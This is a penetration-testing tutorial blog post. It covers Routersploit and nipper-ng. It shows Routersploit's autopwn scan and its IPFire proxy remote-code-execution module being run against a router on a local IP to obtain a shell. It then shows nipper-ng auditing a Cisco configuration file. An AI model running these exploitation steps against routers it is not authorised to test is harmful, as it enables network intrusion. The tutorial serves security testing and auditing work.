<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Router Penetration Testing</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/router-penetration-testing/" rel="bookmark"><time class="entry-date published updated" datetime="2020-11-21T12:59:23+00:00">November 21, 2020</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <h3><span style="color: #800000;"><strong>Introduction</strong></span></h3>
<p><span style="color: #000000;">Embedded devices are an essential part of a network. In corporate environment as well as small home networks there is at least one router/switch and gaining access to it means gaining access to the whole network and needless to say, people don’t like investing much money in these kinds of network devices and most home broadband routers are running old firmware whose exploits are already available publicly. Today, we’ll look at two tools: <strong>Routersploit</strong> for the exploitation of routers and switches and the other tool, <strong>nipper-ng</strong>, for auditing of routers’ and switches’ configuration files. Let’s begin</span></p>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<ol>
<li><strong><span style="color: #000000;">Routersploit</span></strong>
<ol>
<li><span style="color: #000000;">Installation</span></li>
<li><span style="color: #000000;">Running routersploit</span></li>
<li><span style="color: #000000;">Searching modules</span></li>
<li><span style="color: #000000;">Exploitation</span></li>
</ol>
</li>
<li><strong><span style="color: #000000;">Nipper-ng</span></strong>
<ol>
<li><span style="color: #000000;">Installation</span></li>
<li><span style="color: #000000;">Auditing a sample switch configuration file</span></li>
</ol>
</li>
</ol>
<h3><span style="color: #800000;"><strong>Routersploit</strong></span></h3>
<p><span style="color: #000000;">The Routersploit Framework is an open-source exploitation framework dedicated to embedded devices.</span></p>
<p><span style="color: #000000;">It consists of various modules that aids penetration testing operations:</span></p>
<ul>
<li><span style="color: #000000;">exploits – modules that take advantage of identified vulnerabilities</span></li>
<li><span style="color: #000000;">creds – modules designed to test credentials against network services</span></li>
<li><span style="color: #000000;">scanners – modules that check if a target is vulnerable to any exploit</span></li>
<li><span style="color: #000000;">payloads – modules that are responsible for generating payloads for various architectures and injection points</span></li>
<li><span style="color: #000000;">generic – modules that perform generic attacks</span></li>
</ul>
<p><span style="color: #000000;">To install routersploit, we’d need to first install pip and then clone repository of routersploit.</span></p>
<pre class="lang:default decode:true">apt-get install python3-pip
git clone https://www.github.com/threat9/routersploit.git/
python3 -m pip install -r requirements.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nWhegYQSQYo/X7kM8L_dw_I/AAAAAAAAq7U/RS9dgSLBq604U49C8EB4OI5ntvy9x9OcgCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Further, we’d need to install two more packages that will help with the overall operation of the framework:</span></p>
<pre class="lang:default decode:true">apt-get install libglib2.0-dev
python3 -m pip install bluepy</pre>
<p><span style="color: #000000;">After the successful installation of the requirements and the packages, to launch routersploit framework type in the following command:</span></p>
<pre class="lang:default decode:true">python3 rsf.py</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-u3N60lEPyss/X7kNAA3XvJI/AAAAAAAAq7Y/P-EjhOAEXcU4NzmDYO2lZLKLBIU8ilERACLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Very well. In the main menu, we see the version number. Make sure the version is always up to date using the following commands:</span></p>
<pre class="lang:default decode:true">cd routersploit
git pull</pre>
<p><span style="color: #000000;">To open a list of what all can be done type in help.</span></p>
<p><span style="color: #000000;">There would be a list of all the modules that we can use as explained above in the introduction. Let’s say we want to search the types of scanners and out of the list available we want to use the autopwn scanner so we type in the following commands:</span></p>
<pre class="lang:default decode:true">search scanners
use scanners/autopwn</pre>
<p><span style="color: #000000;">We picked autopwn scanner to look for suitable exploits of my current router/switch and give out a list of it for further exploitation purposes.</span></p>
<p><span style="color: #000000;">There are other scanners available too for specific purposes like CCTV cameras.</span></p>
<p><span style="color: #000000;">To further run this exploit, we’ll first look at the options available in the exploit interface with the following command:</span></p>
<pre class="lang:default decode:true">show options</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-usTtHYpBkbU/X7kNE5rweII/AAAAAAAAq7c/ZSTM-FWImX8VU9AF_GsAkrTqcpogsIFhACLcBGAsYHQ/s16000/3.png"/></strong></span></p>
<p><span style="color: #000000;">Now, we’ll just have to set some options in the exploit to run it.</span></p>
<pre class="lang:default decode:true">target = 192.168.29.200 (Router’s IP)
http_port = 444</pre>
<p><span style="color: #000000;"><em>Note: If you don’t want to conduct the experiment on your current hardware, you can install VyOS as well.</em></span></p>
<pre class="lang:default decode:true">set target 192.168.29.200
set http_port 444
run</pre>
<p><span style="color: #000000;">After running successfully, we see that the router is indeed vulnerable to remote code execution as marked below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EJ61pSNjVko/X7kNJNCLyyI/AAAAAAAAq7g/UiQKAucHhH4-0X2ogQHTEsL4vb6zFv2gwCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Now all that’s left to do is to select the exploit and run it. Follow the commands to do so:</span></p>
<pre class="lang:default decode:true">use exploits/routers/ipfire/ipfire_proxy_rce
set target 192.168.29.200
set port 444
run</pre>
<p><span style="color: #000000;">And we have successfully exploited the router and see a command window opened! We execute a test command and see it worked. We can further perform many other actions by looking for additional payloads using the command:</span></p>
<pre class="lang:default decode:true">show payloads</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rEJ6hwqKPWA/X7kNMfa0V-I/AAAAAAAAq7o/s5iOHGKO6ocfslgePUB_8a8JAbhHH-5PgCLcBGAsYHQ/s16000/5.png"/></span></p>
<h3><span style="color: #800000;"><strong>Nipper-ng</strong></span></h3>
<p><span style="color: #000000;"><strong>Nipper-ng</strong> software is used to make observations about/ audit the security configurations of many different device types such as routers, firewalls, and switches of a network infrastructure. It was previously known as CiscoParse. To install and see what all commands can be run:</span></p>
<pre class="lang:default decode:true">apt-get install nipper-ng
nipper -h</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UUzStqb4SYo/X7kNQxBOOHI/AAAAAAAAq7w/CMEXuNWAhe4e06oxTT607kZb4a1yIoWwwCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">To view a detailed help window about a specific topic as shown in the image above we need to give the following command:</span></p>
<pre class="lang:default decode:true">nipper --help</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XT62WL6rfeI/X7kNUZbk7nI/AAAAAAAAq70/PaQ52lTVf9olRY5XuH4irBi0UheZGRjIQCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">Now, as we know that SNMP is commonly used in many routers and switches so we’ll explore the SNMP options in nipper.</span></p>
<pre class="lang:default decode:true">nipper --help=SNMP</pre>
<p><span style="color: #000000;">With this command, we see what all options for SNMP module can be delivered in the command. For example, it can:</span></p>
<ol>
<li><span style="color: #000000;">Retrieve current configuration from a router</span></li>
<li><span style="color: #000000;">Audit/ review the device’s configuration from a *.conf file or a *.txt file that is stored locally</span></li>
</ol>
<p><span style="color: #000000;">You can manually check the other commands as well.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Wm3E5UTrEUs/X7kNYHoeu1I/AAAAAAAAq74/TuruYLzu9KkONEWq57J0RPgHRSJLC1b8wCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">We’d form a command to review the configuration of a Cisco IOS-based router but other devices can be selected from the command line parameters given below:</span></p>
<p><span style="color: #000000;">–ios-switch    Cisco IOS-based Switch</span></p>
<p><span style="color: #000000;">–ios-router    Cisco IOS-based Router (default)</span></p>
<p><span style="color: #000000;">–ios-catalyst  Cisco IOS-based Catalyst</span></p>
<p><span style="color: #000000;">–pix           Cisco PIX-based Firewall</span></p>
<p><span style="color: #000000;">–asa           Cisco ASA-based Firewall</span></p>
<p><span style="color: #000000;">–fwsm          Cisco FWSM-based Router</span></p>
<p><span style="color: #000000;">–catos         Cisco CatOS-based Catalyst</span></p>
<p><span style="color: #000000;">–nmp           Cisco NMP-based Catalyst</span></p>
<p><span style="color: #000000;">–css           Cisco Content Services Switch</span></p>
<p><span style="color: #000000;">–screenos      Juniper NetScreen Firewall</span></p>
<p><span style="color: #000000;">–passport      Nortel Passport Device</span></p>
<p><span style="color: #000000;">–sonicos       SonicWall SonicOS Firewall</span></p>
<p><span style="color: #000000;">–fw1           CheckPoint Firewall-1 Firewall</span></p>
<p><span style="color: #000000;">Now, we craft a command from a router configuration file. Follow the link <a style="color: #000000;" href="https://www.cisco.com/c/en/us/support/docs/ios-nx-os-software/ios-software-releases-122-mainline/46741-backup-config.html">here</a> to see how to back up and restore a router configuration file in case of a cisco router. We’ll have to define three parameters in the following command:</span></p>
<p><span style="color: #000000;">ios-router: type of device</span></p>
<p><span style="color: #000000;">input: the router configuration file</span></p>
<p><span style="color: #000000;">output: destination of the audit report</span></p>
<p><span style="color: #000000;">The command is as follows:</span></p>
<pre class="lang:default decode:true  ">nipper –ios-router –input=/root/Desktop/router.txt –output=report.html</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-63aX0-M7RcU/X7kNcPkJSRI/AAAAAAAAq8E/w5TjAVj_cqEF5WBJQLvrvzoaZ_8EG32cwCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">And just like that, it is done after a few moments! To review the report as HTML we open it in firefox and we can see a detailed security report of the network device we just audited!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IzYWJliiUo8/X7kNgafw1gI/AAAAAAAAq8I/Cd2kIOk0ssU0bTVV3tfcsVxLZ22QdrEnwCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;"><strong>Conclusion</strong></span></p>
<p><span style="color: #000000;">We covered two tools in this article: Routersploit, which is a framework for the exploitation of various network devices and the other, Nipper-ng, which is the open-source variant of nipper studio but generates comprehensive reports on security misconfigurations of the network devices. The network devices should be kept updated with the latest firmware to prevent various attacks and these two tools will prove to be useful for the case. These are two handy tools for auditors and security analysts who had to check configurations manually and would reduce the workload by many notches. Hope this article proves to be beneficial.</span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact<strong> <a class="broken_link" style="color: #000000;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
